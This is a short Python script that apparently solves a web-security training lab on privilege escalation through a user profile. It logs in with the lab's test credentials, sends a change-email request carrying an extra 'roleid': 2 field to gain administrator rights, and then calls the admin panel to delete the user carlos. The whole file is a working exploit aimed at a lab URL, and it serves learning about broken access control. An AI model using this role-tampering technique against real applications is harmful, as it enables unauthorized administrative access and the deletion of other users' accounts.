##########################################################
#
# Lab: User role can be modified in user profile
#
# Hack Steps: 
#      1. Login as wiener
#      2. Change the roleid of wiener
#      3. Delete carlos from the admin panel
#
##########################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ab80061044fc3868049e4d500c1000f.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter" }
    login_as_wiener = post_data("/login", data)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Changing the roleid to 2.. ", end="", flush=True)
        
    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    data = """{ "email": "wiener@admin.net", "roleid": 2 }"""
    headers = { "Content-Type": "text/plain" }
    post_data("/my-account/change-email", data, cookies, headers)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Deleting carlos from the admin panel.. ", end="", flush=True)
    
    fetch("/admin/delete?username=carlos", cookies=cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, headers = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

